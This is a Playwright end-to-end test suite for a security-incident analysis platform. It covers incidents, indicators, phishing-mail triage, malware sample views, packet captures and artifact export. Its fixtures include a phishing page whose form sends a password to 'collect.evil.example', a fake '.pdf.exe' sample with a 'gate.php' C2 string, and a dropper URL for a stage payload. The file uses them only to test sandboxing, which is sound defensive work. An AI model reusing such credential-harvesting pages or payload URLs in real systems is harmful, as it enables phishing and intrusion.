import { readFileSync } from 'node:fs'
import { test, expect } from '@playwright/test'
import { buildSamplePe, phishingEml } from './helpers.js'

/*
 * Smoke test of the whole stack, as an analyst would use it on a fresh
 * install: create the first (admin) account, sign in, open an incident, drop
 * the evidence files of each tab (e2e/fixtures/) and check that the timeline
 * merges their events. One browser context is shared by the steps, in order.
 */

const ADMIN = { username: 'admin', password: 'supersecret' }

// No retries: the steps share one server and one account, so a retry from the
// first step can only fail ("first run" is over) and hide the real error.
test.describe.configure({ mode: 'serial', retries: 0 })

let page
// What the Content-Security-Policy blocked, if anything: the suite ends by checking it is empty.
const blocked = []

/** Drop a fixture file on the app, as from the file manager, and import it where Nik proposes. */
async function dropFixture(name) {
  const content = readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8')
  const transfer = await page.evaluateHandle(
    ([fileName, text]) => {
      const data = new DataTransfer()
      data.items.add(new File([text], fileName))
      return data
    },
    [name, content],
  )
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toBeVisible()
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(dialog).toBeHidden()
}

test.beforeAll(async ({ browser }) => {
  page = await browser.newPage()
  page.on('pageerror', (error) => {
    throw new Error(`Uncaught error in the page: ${error.message}`)
  })
  page.on('console', (message) => {
    if (/Content Security Policy|Content-Security-Policy/i.test(message.text())) blocked.push(message.text())
  })
})

test.afterAll(async () => {
  await page.close()
})

test('first run creates the admin account', async () => {
  await page.goto('/')
  await expect(page.getByText('first run')).toBeVisible()
  await page.fill('#setup-username', ADMIN.username)
  await page.fill('#setup-password', ADMIN.password)
  await page.fill('#setup-confirm', ADMIN.password)
  await page.click('button[type=submit]')
  await expect(page.locator('#login-username')).toBeVisible()
})

test('the admin signs in and sees the empty dashboard', async () => {
  await page.fill('#login-username', ADMIN.username)
  await page.fill('#login-password', ADMIN.password)
  await page.click('button[type=submit]')
  await expect(page.getByText('No active incident')).toBeVisible()
})

test('a new incident opens on its summary', async () => {
  await page.click('aside >> text=New incident')
  await page.fill('#new-host', 'WKS-FINANCE-01')
  await page.fill('#new-username', 'm.rossi')
  await page.click('button[type=submit]:has-text("Create incident")')
  await expect(page.getByText('Incident details')).toBeVisible()
  await expect(page.locator('aside nav[aria-label="Incidents"]')).toContainText('WKS-FINANCE-01')
})

test('the tab bar fits the window and every tab keeps its name', async () => {
  const nav = page.locator('nav[aria-label="Analysis tabs"]')
  const fits = () => nav.evaluate((element) => element.scrollWidth <= element.clientWidth + 1)
  const original = page.viewportSize()
  for (const width of [original.width, 1000]) {
    await page.setViewportSize({ width, height: original.height })
    // Shorter labels, then icons only: the bar never needs to scroll sideways.
    await expect.poll(fits).toBe(true)
    await expect(nav.getByRole('button', { name: 'Command History', exact: true })).toBeVisible()
  }
  await page.setViewportSize(original)
  // Controls side by side share one height.
  const heights = await page
    .locator('header button, header div.border')
    .evaluateAll((elements) => [...new Set(elements.filter((e) => e.offsetHeight).map((e) => e.offsetHeight))])
  expect(heights).toEqual([36])
})

test('evidence files dropped on the app fill the analysis tabs', async () => {
  const current = page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')
  const files = [
    ['Bookmarks', 'Browser Forensics', /^Bookmarks/],
    ['bash_history', 'Command History'],
    ['bam-export.csv', 'Endpoint Artifacts'],
    ['nik-eventlogs.json', 'Event Logs'],
  ]
  for (const [name, tab, section] of files) {
    await dropFixture(name)
    await expect(current).toContainText(tab)
    if (section) {
      await page
        .getByRole('navigation', { name: 'Browser analysis sections' })
        .getByRole('button', { name: section })
        .click()
    }
    await expect(page.locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
  }
})

test('the timeline merges the events of every tab', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Timeline', exact: true }).click()
  await expect(page.locator('tbody tr').first()).toBeVisible()
  const counter = page.getByText(/of \d+ results/)
  await expect(counter).toBeVisible()
  expect(await counter.textContent()).not.toMatch(/of 0 results/)
  for (const source of ['Bash', 'Security']) {
    await expect(page.locator('tbody').getByText(source).first()).toBeVisible()
  }
})

test('the IOCs tab gathers the indicators and shows where they were seen', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'IOCs', exact: true }).click()
  const attacker = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(attacker).toBeVisible({ timeout: 20_000 })
  await attacker.click()
  const dialog = page.getByRole('dialog', { name: 'Indicator' })
  await expect(dialog.getByRole('region', { name: 'Seen in' })).toContainText('WKS-FINANCE-01')
  // Sources: keyless providers are ready; nothing is sent until asked.
  await expect(dialog.getByRole('button', { name: 'Check now' })).toBeVisible()
  await expect(dialog.getByRole('region', { name: 'Sources' })).toContainText('Not checked yet')
  await expect(dialog).toContainText('not checked')
  await page.keyboard.press('Escape')
  // Seen in another incident is a plain number now: only the verdict colours a row.
  await expect(page.getByRole('button', { name: /^Check all \d+$/ })).toBeVisible()
  await expect(page.getByRole('button', { name: 'Save as a list' })).toBeVisible()
  await attacker.click()
  // The window becomes a page with its own address, and goes back to where it was opened.
  const before = new URL(page.url()).pathname
  await dialog.getByRole('button', { name: 'Open as a page' }).click()
  await expect(page).toHaveURL(/\/ioc\/ip\?v=185\.220\.101\.47$/)
  // The address alone opens the indicator (a shared link, a bookmark).
  await page.reload()
  await expect(page.getByRole('dialog', { name: 'Indicator' }).getByRole('region', { name: 'Seen in' })).toContainText(
    'WKS-FINANCE-01',
    { timeout: 20_000 },
  )
  await page.getByRole('dialog', { name: 'Indicator' }).getByRole('button', { name: 'Open', exact: true }).click()
  await expect(page.getByRole('dialog', { name: 'Indicator' })).toHaveCount(0)
  expect(new URL(page.url()).pathname).toBe(before)
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'IOCs', exact: true }).click()
})

test('threat intelligence is configured in Settings, keys never shown', async () => {
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  const settings = page.getByRole('region', { name: 'Settings' })
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Threat intelligence').click()
  const ips = settings.getByRole('switch', { name: /IP addresses/ })
  await expect(ips).not.toBeChecked()
  await ips.check()
  await expect(ips).toBeChecked()
  const virustotal = settings.getByRole('listitem').filter({ hasText: 'VirusTotal' }).first()
  await settings.getByLabel('VirusTotal API key', { exact: true }).fill('e2e-virustotal-key-0042')
  await virustotal.getByRole('button', { name: 'Add key' }).click()
  await expect(virustotal.getByText('key …0042')).toBeVisible()
  await expect(settings.getByLabel('VirusTotal API key', { exact: true })).toHaveValue('')
  // A second key, with a label: the lookups will go round the two.
  await settings.getByLabel('VirusTotal API key', { exact: true }).fill('e2e-virustotal-key-0043')
  await settings.getByLabel('Label of the VirusTotal key').fill('second account')
  await virustotal.getByRole('button', { name: 'Add key' }).click()
  await expect(virustotal.getByText('2 keys in rotation')).toBeVisible()
  const keys = settings.getByRole('list', { name: 'VirusTotal API keys' })
  await expect(keys.getByRole('listitem')).toHaveCount(2)
  await expect(keys).toContainText('second account')
  await expect(settings).not.toContainText('e2e-virustotal-key')
  await keys.getByRole('button', { name: 'Remove the VirusTotal key ending in 0043' }).click()
  await expect(keys.getByRole('listitem')).toHaveCount(1)
  // How long an answer stands, per type, and what VirusTotal is asked for.
  await expect(settings.getByLabel('File hashes: days an answer stands')).toHaveValue('180')
  await expect(settings.getByRole('switch', { name: /Ask again when an answer has expired/ })).toBeChecked()
  await expect(settings.getByLabel('VirusTotal vendors listed')).toHaveValue('flagged')
  await expect(settings.getByRole('switch', { name: /^Relations/ })).not.toBeChecked()
  await settings.getByLabel('IP addresses: days an answer stands').fill('45')
  await ips.uncheck()
  await settings.getByRole('button', { name: 'Close settings' }).click()
  await page.getByRole('button', { name: 'Open platform settings' }).click()
  await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('Threat intelligence').click()
  await expect(settings.getByLabel('IP addresses: days an answer stands')).toHaveValue('45')
  await settings.getByRole('button', { name: 'Close settings' }).click()
})

test('right-click on an indicator adds it to the allowlist, with undo', async () => {
  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'IOCs', exact: true }).click()
  const value = page.getByRole('button', { name: '185.220.101.47', exact: true })
  await expect(value).toBeVisible({ timeout: 20_000 })
  await value.click({ button: 'right' })
  const menu = page.getByRole('menu')
  await expect(menu).toContainText('Where else was this seen?')
  await menu.getByRole('menuitem', { name: 'Add to the allowlist…' }).click()
  const dialog = page.getByRole('dialog', { name: 'Add to the allowlist' })
  await expect(dialog).toContainText('185.220.101.0/24')
  await dialog.getByRole('button', { name: 'Add to the allowlist' }).click()
  await expect(value).toBeHidden({ timeout: 10_000 })
  await page.getByRole('button', { name: 'Undo' }).click()
  await expect(value).toBeVisible({ timeout: 10_000 })
})

test('a file dropped anywhere goes to the right tab', async () => {
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['#1762500000\nwhoami /priv\n'], '.zsh_history', { type: 'text/plain' }))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toContainText('Shell history')
  await expect(dialog.getByLabel('Shell')).toHaveValue('zsh')
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')).toContainText('Command History')
  await expect(page.getByText('whoami /priv').first()).toBeVisible()
})

test('the search palette finds indicators and runs actions', async () => {
  await page.keyboard.press('ControlOrMeta+k')
  const palette = page.getByRole('dialog', { name: 'Search' })
  await expect(palette).toBeVisible()
  await palette.getByRole('textbox', { name: 'Search' }).fill('185.220.101')
  await expect(palette.getByRole('option', { name: /185\.220\.101\.47/ }).first()).toBeVisible()
  // ">" lists actions: jump to the Timeline tab.
  await palette.getByRole('textbox', { name: 'Search' }).fill('> timeline')
  await page.keyboard.press('Enter')
  await expect(palette).toBeHidden()
  await expect(page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')).toContainText('Timeline')
})

test('the incident report is built by the server and previewed', async () => {
  await page.getByRole('button', { name: 'Incident report' }).click()
  const dialog = page.getByRole('dialog', { name: 'Incident report' })
  await dialog.getByRole('textbox').fill('Phishing e-mail, then a remote shell.')
  await dialog.getByRole('button', { name: 'Preview' }).click()
  const frame = page.frameLocator('iframe[title="Report preview"]')
  await expect(frame.getByRole('heading', { name: 'Incident report' })).toBeVisible({ timeout: 20_000 })
  await expect(frame.getByText('Phishing e-mail, then a remote shell.')).toBeVisible()
  // By default the report lists only what was flagged: nothing yet.
  await expect(frame.getByText('what the analysts flagged')).toBeVisible()
  await expect(frame.getByText('Nothing was flagged here.').first()).toBeVisible()
  await expect(frame.getByText('185.220.101.47').first()).toBeHidden()
  // "Include everything" brings back the whole incident.
  await dialog.getByRole('checkbox', { name: /^Include everything/ }).check()
  await dialog.getByRole('button', { name: 'Preview' }).click()
  await expect(frame.getByText('everything in the incident')).toBeVisible({ timeout: 20_000 })
  await expect(frame.getByText('185.220.101.47').first()).toBeVisible()
  await dialog.getByRole('checkbox', { name: /^Include everything/ }).uncheck()
  await page.keyboard.press('Escape')
})

test('a sample is stored, analysed and shown with its indicators', async () => {
  // With the real workers this test waits for rizin, two capa rule checks
  // (~10 s each) and a second capa run: more than the 60 s default.
  if (process.env.E2E_ANALYZER_URL || process.env.E2E_CAPA_URL) test.setTimeout(300_000)
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'Malware Analysis', exact: true })
    .click()
  await expect(page.getByText('No samples yet')).toBeVisible()
  await page.getByRole('button', { name: 'Upload malware samples' }).locator('input[type=file]').setInputFiles({
    name: 'invoice_0423.pdf.exe',
    mimeType: 'application/octet-stream',
    buffer: buildSamplePe(),
  })
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice_0423.pdf.exe')
  await expect(page.getByText('PE32 executable, Intel 80386').first()).toBeVisible()
  await expect(page.locator('dd', { hasText: /^[0-9a-f]{64}/ }).first()).toBeVisible()
  await page.getByRole('tab', { name: /^IOC/ }).click()
  await expect(page.locator('tbody tr', { hasText: 'gate.php' })).toBeVisible()
  await expect(page.getByText('process injection').first()).toBeVisible()
  // Structure (parsed by pefile) and YARA (built-in injection rule) views.
  await page.getByRole('tab', { name: 'Structure' }).click()
  await expect(page.getByText('windows gui')).toBeVisible()
  await expect(page.locator('tbody tr', { hasText: '.text' })).toBeVisible()
  await page.getByRole('tab', { name: /^YARA/ }).click()
  await expect(page.getByText('pe_process_injection_apis')).toBeVisible()
  // Code view: rizin in CI (analyzer container), "not configured" elsewhere.
  await page.getByRole('tab', { name: 'Code' }).click()
  if (process.env.E2E_ANALYZER_URL) {
    // Recognised code (here the entry stub, runtime) is hidden by default; the
    // helper uses the URL, so it is where to start.
    await expect(page.locator('tbody tr', { hasText: 'fcn.0040100f' })).toBeVisible({ timeout: 60_000 })
    await expect(page.locator('tbody tr', { hasText: 'entry0' })).toHaveCount(0)
    await expect(page.getByRole('region', { name: 'Start here' })).toContainText('gate.php')
    await page.getByLabel(/Hide recognised library code/).uncheck()
    await expect(page.locator('tbody tr', { hasText: 'entry0' })).toBeVisible()
    await page.getByRole('tab', { name: 'Control flow' }).click()
    const cfg = page.locator('svg[aria-label^="Control flow of entry0"]')
    await expect(cfg).toBeVisible({ timeout: 30_000 })
    await expect(cfg).toContainText('push')
    await expect(cfg.locator('g.cursor-pointer')).toHaveCount(3) // three basic blocks
    // Pseudo-C from rz-ghidra, decompiled by the analysis; the call to the helper is a
    // link that opens the helper's own pseudo-C.
    await page.getByRole('tab', { name: 'Decompiled' }).click()
    const code = page.locator('pre', { hasText: 'entry0' })
    await expect(code).toContainText('void entry0(void)', { timeout: 30_000 })
    await expect(page.getByText('from the analysis')).toBeVisible()
    await code.getByRole('button', { name: 'fcn.0040100f' }).click()
    await expect(page.locator('pre', { hasText: 'fcn.0040100f(void)' })).toContainText('return 0;', {
      timeout: 60_000,
    })
    // Switching functions with a graph open: the new graph (no calls) must not be
    // drawn with the previous function's layout (one edge) while ELK recomputes.
    await page.getByRole('tab', { name: 'Call graph' }).click()
    const rows = page.locator('tbody tr')
    for (const name of ['entry0', 'fcn.0040100f', 'entry0', 'fcn.0040100f']) {
      await rows.filter({ hasText: name }).first().click()
      await expect(page.locator(`svg[aria-label^="Calls from ${name}"]`)).toBeVisible({ timeout: 30_000 })
    }
    // Rename the helper: the new name replaces rizin's in the list and in the caller's pseudo-C.
    await page.getByRole('button', { name: 'Rename / comment' }).click()
    await page.getByLabel(/^Name/).fill('send_beacon')
    await page.getByLabel('Comment', { exact: true }).fill('Loads the C2 URL')
    await page.getByRole('button', { name: 'Save' }).click()
    await expect(page.getByText('Loads the C2 URL')).toBeVisible()
    await expect(rows.filter({ hasText: 'send_beacon' })).toBeVisible()
    await rows.filter({ hasText: 'entry0' }).first().click()
    await page.getByRole('tab', { name: 'Decompiled' }).click()
    await expect(page.locator('pre').getByRole('button', { name: 'send_beacon' })).toBeVisible({ timeout: 30_000 })
    // The IOC table links the URL to the function that uses it.
    await page.getByRole('tab', { name: /^IOC/ }).click()
    await page.locator('tbody tr', { hasText: 'gate.php' }).getByRole('button', { name: 'send_beacon' }).click()
    await expect(page.locator('svg[aria-label^="Calls from send_beacon"]')).toBeVisible({ timeout: 30_000 })
  } else {
    await expect(page.getByText('The analyzer worker is not configured.')).toBeVisible()
  }
  // Capabilities view: real capa in CI (capa container), "not configured" elsewhere.
  // The smoke sample is too small to match any capa rule.
  await page.getByRole('tab', { name: /^Capabilities/ }).click()
  if (process.env.E2E_CAPA_URL) {
    await expect(page.getByText('capa found no capabilities in this sample.')).toBeVisible({ timeout: 120_000 })
    await expect(page.getByText('capa 10.0.0')).toBeVisible()
    // An admin capa rule: checked by the worker, matched after Re-analyse, marked custom.
    await page.getByRole('button', { name: 'Open platform settings' }).click()
    const settings = page.getByRole('region', { name: 'Settings' })
    await settings.getByRole('navigation', { name: 'Settings sections' }).getByText('capa rules').click()
    await settings.getByRole('button', { name: 'Add rule' }).click()
    await settings
      .getByLabel('capa rule (YAML)')
      .fill(
        'rule:\n  meta:\n    name: reference team C2 gate\n    namespace: team/c2\n    authors:\n      - e2e\n' +
          '    scopes:\n      static: file\n      dynamic: file\n  features:\n    - string: /gate\\.php/\n',
      )
    await settings.getByRole('button', { name: 'Validate' }).click()
    await expect(settings.getByText('Valid: reference team C2 gate')).toBeVisible({ timeout: 60_000 })
    await settings.getByRole('button', { name: 'Save rule' }).click()
    await expect(settings.getByRole('button', { name: 'Delete reference team C2 gate' })).toBeVisible({
      timeout: 60_000,
    })
    await settings.getByRole('button', { name: 'Close settings' }).click()
    await page.getByRole('button', { name: 'Re-analyse' }).click()
    await page.getByRole('tab', { name: /^Capabilities/ }).click()
    const custom = page.locator('tbody tr', { hasText: 'reference team C2 gate' })
    await expect(custom).toBeVisible({ timeout: 120_000 })
    await expect(custom.getByText('custom', { exact: true })).toBeVisible()
  } else {
    await expect(page.getByText('The capa worker is not configured.')).toBeVisible()
  }
})

test('a reported e-mail is triaged: verdict, sandboxed body, attachment sent to Malware Analysis', async () => {
  const eml = phishingEml()
  const transfer = await page.evaluateHandle((text) => {
    const data = new DataTransfer()
    data.items.add(new File([text], 'reported.eml', { type: 'message/rfc822' }))
    return data
  }, eml)
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  const dialog = page.getByRole('dialog', { name: 'Add a file' })
  await expect(dialog).toContainText('E-mail (.eml)')
  await dialog.getByRole('button', { name: 'Import' }).click()
  await expect(page.locator('nav[aria-label="Analysis tabs"] [aria-current="page"]')).toContainText('Mail Analysis')
  await expect(page.getByRole('list', { name: 'Messages' })).toContainText('Your account will be suspended', {
    timeout: 60_000,
  })
  await expect(page.getByText('the sender domain paypai.example imitates paypal')).toBeVisible()
  await expect(page.getByText(/^phishing · \d+$/)).toBeVisible()
  await expect(page.locator('aside nav[aria-label="Incidents"]').getByLabel('Holds e-mails')).toBeVisible()
  // The body is drawn in a frame that runs nothing and follows no link.
  await page.getByRole('tab', { name: 'Body' }).click()
  const frame = page.locator('iframe[title="Message body (sandboxed)"]')
  await expect(frame).toHaveAttribute('sandbox', '')
  await expect(page.getByText('1 hidden')).toBeVisible()
  const body = page.frameLocator('iframe[title="Message body (sandboxed)"]')
  await expect(body.getByText('Verify your account immediately.')).toBeVisible()
  await expect(body.locator('script')).toHaveCount(0)
  await expect(body.locator('a[href]')).toHaveCount(0)
  await page.getByRole('tab', { name: /^Links/ }).click()
  await expect(page.locator('tbody tr', { hasText: 'login-paypa1.top' })).toContainText('text ≠ target')
  await page.getByRole('tab', { name: /^Attachments/ }).click()
  await expect(page.getByText('double extension .pdf.exe')).toBeVisible()
  await page.getByRole('button', { name: 'Hex' }).click()
  await expect(page.getByText('00000000  4d 5a 00 00')).toBeVisible()
  await page.getByRole('button', { name: 'Send to Malware Analysis' }).click()
  const toast = page.getByRole('status').filter({ hasText: 'invoice.pdf.exe is now a sample of this incident.' })
  await toast.getByRole('button', { name: 'Open', exact: true }).click()
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('invoice.pdf.exe')
})

test('attachments are previewed by the isolated workers', async () => {
  const pdf =
    '%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n' +
    '3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 300 200]>>endobj\ntrailer<</Root 1 0 R>>\n%%EOF\n'
  const html =
    '<html><head><title>Sign in</title></head><body>' +
    // Opens a second window, as a sign-in page does for its help or its identity provider.
    '<a target="_blank" href="?help=1" style="position:fixed;left:0;top:0;width:220px;height:44px">Help</a>' +
    '<form action="https://collect.evil.example/p">' +
    '<input name="pw"></form><img src="https://cdn.evil.example/logo.png"></body></html>'
  const eml = [
    'From: Billing <billing@invoices.example>',
    'To: m.rossi@contoso.example',
    'Subject: Statement and secure link',
    'MIME-Version: 1.0',
    'Content-Type: multipart/mixed; boundary="b2"',
    '',
    '--b2',
    'Content-Type: text/plain',
    '',
    'See the attached statement.',
    '--b2',
    'Content-Type: application/pdf; name="statement.pdf"',
    'Content-Disposition: attachment; filename="statement.pdf"',
    'Content-Transfer-Encoding: base64',
    '',
    Buffer.from(pdf).toString('base64'),
    '--b2',
    'Content-Type: text/html; name="secure.html"',
    'Content-Disposition: attachment; filename="secure.html"',
    'Content-Transfer-Encoding: base64',
    '',
    Buffer.from(html).toString('base64'),
    '--b2--',
    '',
  ].join('\r\n')
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'Mail Analysis', exact: true })
    .click()
  await page
    .getByRole('button', { name: 'Upload e-mails' })
    .locator('input[type=file]')
    .setInputFiles({ name: 'statement.eml', mimeType: 'message/rfc822', buffer: Buffer.from(eml) })
  await page.getByRole('list', { name: 'Messages' }).getByText('Statement and secure link').click()
  await page.getByRole('tab', { name: /^Attachments/ }).click()
  const preview = page.getByRole('button', { name: 'Preview' })
  const browse = page.getByRole('button', { name: 'Open in isolated browser' })
  if (process.env.E2E_DOCVIEW_URL) {
    await preview.click()
    await expect(page.getByRole('img', { name: 'Page 1 of statement.pdf' })).toBeVisible({ timeout: 60_000 })
    await page.keyboard.press('Escape')
  } else {
    await expect(preview).toBeDisabled()
  }
  if (process.env.E2E_BROWSER_URL) {
    await browse.click()
    await page
      .getByRole('dialog', { name: 'Open in the isolated browser' })
      .getByRole('button', { name: 'Open' })
      .click()
    const remote = page.getByRole('dialog', { name: /^Isolated browser/ })
    await expect(remote.getByRole('application', { name: /Remote page/ })).toBeVisible({ timeout: 60_000 })
    await expect(remote).toContainText('no network')
    await expect(remote).toContainText(/request(s)? refused/)
    // The page is drawn at the size of the space it has: one picture pixel per screen pixel.
    const picture = remote.getByRole('img', { name: /^Screenshot of/ })
    await expect
      .poll(() => picture.evaluate((img) => img.naturalWidth > 1000 && img.naturalWidth === img.clientWidth), {
        timeout: 20_000,
      })
      .toBe(true)
    await expect(remote.getByRole('button', { name: 'Full screen' })).toBeVisible()
    // A window the page opens is a tab of the session; closing it shows the first one again.
    const tabs = remote.getByRole('tablist', { name: 'Tabs of the session' })
    await expect(tabs).toHaveCount(0)
    await remote.getByRole('application', { name: /Remote page/ }).click({ position: { x: 30, y: 15 } })
    await expect(tabs.getByRole('tab')).toHaveCount(2, { timeout: 20_000 })
    await expect(tabs.getByRole('tab').nth(1)).toHaveAttribute('aria-selected', 'true')
    await tabs.getByRole('tab').first().click()
    await expect(tabs.getByRole('tab').first()).toHaveAttribute('aria-selected', 'true')
    await tabs
      .getByRole('button', { name: /^Close the tab/ })
      .nth(1)
      .click()
    await expect(tabs).toHaveCount(0)
    // The Network panel lists the refused requests (the page's image, its form target).
    await remote.getByRole('button', { name: /^Network/ }).click()
    // One per tab that loaded the page.
    await expect(remote.locator('tbody tr', { hasText: 'logo.png' }).first()).toContainText('blocked')
    await remote.getByRole('button', { name: 'Close' }).click()
    // The session becomes a capture of the incident.
    await page
      .locator('nav[aria-label="Analysis tabs"]')
      .getByRole('button', { name: 'Network Analysis', exact: true })
      .click()
    await expect(page.getByRole('list', { name: 'Captures' })).toContainText('attachment secure.html', {
      timeout: 30_000,
    })
  } else {
    await expect(browse).toBeDisabled()
  }
})

test('a packet capture opens as in Wireshark', async () => {
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'Network Analysis', exact: true })
    .click()
  await page
    .getByRole('button', { name: 'Upload packet captures' })
    .locator('input[type=file]')
    .setInputFiles('e2e/fixtures/phish.pcapng')
  await expect(page.getByRole('list', { name: 'Captures' })).toContainText('phish.pcapng')
  await page.getByRole('list', { name: 'Captures' }).getByText('phish.pcapng').click()
  if (!process.env.E2E_PCAP_URL) {
    await expect(page.getByText('stored, not analysed')).toBeVisible()
    return
  }
  const packets = page.getByRole('table', { name: 'Packets' })
  await expect(packets.locator('tbody tr').first()).toBeVisible({ timeout: 120_000 })
  // Column headers sort the loaded packets: by length, largest first on the second click.
  const lengths = async () =>
    (await packets.locator('tbody tr td:nth-child(6)').allTextContents()).map((text) => Number(text))
  await packets.getByRole('button', { name: 'Length' }).click()
  const ascending = await lengths()
  expect(ascending).toEqual([...ascending].sort((a, b) => a - b))
  await packets.getByRole('button', { name: 'Length' }).click()
  await expect(packets.getByRole('columnheader', { name: 'Length' })).toHaveAttribute('aria-sort', 'descending')
  const descending = await lengths()
  expect(descending).toEqual([...descending].sort((a, b) => b - a))
  await packets.getByRole('button', { name: 'Length' }).click()
  await expect(packets.getByRole('columnheader', { name: 'Length' })).toHaveAttribute('aria-sort', 'none')
  // A Wireshark display filter, then the packet's tree and its bytes.
  await page.getByLabel('Display filter').fill('http.request.method == "POST"')
  await page.getByRole('button', { name: 'Apply', exact: true }).click()
  await expect(packets.locator('tbody tr')).toHaveCount(1)
  await packets.locator('tbody tr').first().click()
  const tree = page.getByRole('tree', { name: 'Packet details' })
  await expect(tree).toContainText('Hypertext Transfer Protocol')
  // Public addresses in the packet's details are indicators: a click opens their window.
  const address = tree.getByRole('button', { name: /^(203\.0\.113|198\.51\.100)\.\d+$/ }).first()
  await expect(address).toBeVisible()
  await address.click()
  await expect(page.getByRole('dialog', { name: 'Indicator' })).toBeVisible()
  await page.keyboard.press('Escape')
  await expect(tree.getByRole('button', { name: /^10\.\d+\.\d+\.\d+$/ })).toHaveCount(0)
  await tree.getByText('Hypertext Transfer Protocol').click()
  await expect(page.getByLabel('Packet bytes').locator('.bg-accent').first()).toBeVisible()
  // Follow the HTTP stream: the credentials in clear.
  await page.getByRole('button', { name: /^Follow HTTP stream/ }).click()
  await expect(page.getByLabel('Stream content')).toContainText('pass=Winter2026')
  await page.keyboard.press('Escape')
  // Export Objects and the summary.
  await page.getByRole('tab', { name: 'Objects' }).click()
  await expect(page.locator('tbody tr', { hasText: 'invoice.exe' })).toBeVisible()
  await page.getByRole('tab', { name: 'Summary' }).click()
  await expect(page.getByText('6 connections every 30 s')).toBeVisible()
})

test('a file is analysed on its own, tagged, then linked to the incident', async () => {
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: 'New analysis' }).click()
  await page
    .getByRole('dialog', { name: 'New analysis' })
    .locator('input[type=file]')
    .setInputFiles({
      name: 'dropper.bin',
      mimeType: 'application/octet-stream',
      buffer: Buffer.from('MZ analysed on its own http://198.51.100.9/stage.bin'),
    })
  // Nik asks where it goes, with "Start analysis" chosen.
  const place = page.getByRole('dialog', { name: 'Add a file' })
  await expect(place.getByRole('radio', { name: /^Start analysis/ })).toBeChecked()
  await place.getByRole('button', { name: 'Start analysis' }).click()

  const artifact = page.getByRole('region', { name: 'Artifact' })
  await expect(artifact.getByRole('heading', { name: 'dropper.bin' })).toBeVisible({ timeout: 30_000 })
  await expect(artifact).toContainText('Not linked to an incident.')
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  // The same analysis views as in an incident, without the incident-only actions.
  await expect(page.getByRole('button', { name: 'Download zip' })).toBeVisible()
  await expect(page.getByRole('button', { name: 'Remove', exact: true })).toHaveCount(0)

  await artifact.getByRole('button', { name: 'Add tags' }).click()
  await artifact.getByLabel('Tags').fill('Emotet campaign:q4')
  await artifact.getByRole('button', { name: 'Save' }).click()
  await expect(artifact).toContainText('#emotet')
  await panel.getByLabel('Filter artifacts').fill('campaign')
  await expect(panel.getByRole('navigation', { name: 'Artifacts' })).toContainText('dropper.bin')
  await panel.getByLabel('Filter artifacts').fill('')

  await artifact.getByRole('button', { name: 'Link to incident' }).click()
  await page
    .getByRole('dialog', { name: 'Link to incident' })
    .getByRole('button', { name: 'Link', exact: true })
    .click()
  const linked = artifact.getByRole('button', { name: 'WKS-FINANCE-01 - m.rossi', exact: true })
  await expect(linked).toBeVisible()
  // The incident now holds the sample.
  await linked.click()
  await page
    .locator('nav[aria-label="Analysis tabs"]')
    .getByRole('button', { name: 'Malware Analysis', exact: true })
    .click()
  await expect(page.getByRole('list', { name: 'Samples' })).toContainText('dropper.bin', { timeout: 20_000 })

  // Dropped again, the file is recognised as already analysed.
  const transfer = await page.evaluateHandle(() => {
    const data = new DataTransfer()
    data.items.add(new File(['MZ analysed on its own http://198.51.100.9/stage.bin'], 'again.bin'))
    return data
  })
  await page.dispatchEvent('main', 'dragenter', { dataTransfer: transfer })
  await page.dispatchEvent('main', 'drop', { dataTransfer: transfer })
  await expect(page.getByRole('dialog', { name: 'Add a file' })).toContainText('This file was already analysed.')
  await page.keyboard.press('Escape')
  await page.getByRole('button', { name: 'Incidents', exact: true }).click()
})

test('an artifact is exported: the analyses, and the files only when asked', async () => {
  await page.getByRole('button', { name: 'Artifacts', exact: true }).click()
  const panel = page.getByRole('complementary', { name: 'Artifacts panel' })
  await panel.getByRole('button', { name: /^Export \d+$/ }).click()
  const dialog = page.getByRole('dialog', { name: /^Export / })
  // The original files are live malware: not in the archive unless chosen, each time.
  await expect(dialog.getByRole('radio', { name: /^Analyses only/ })).toBeChecked()
  await expect(dialog).not.toContainText('live malware')
  await dialog.getByRole('radio', { name: /^Analyses and the original files/ }).check()
  await expect(dialog).toContainText('password infected')
  await expect(dialog).toContainText('live malware')
  await dialog.getByRole('radio', { name: /^Analyses only/ }).check()
  const download = page.waitForEvent('download')
  await dialog.getByRole('button', { name: 'Download the archive' }).click()
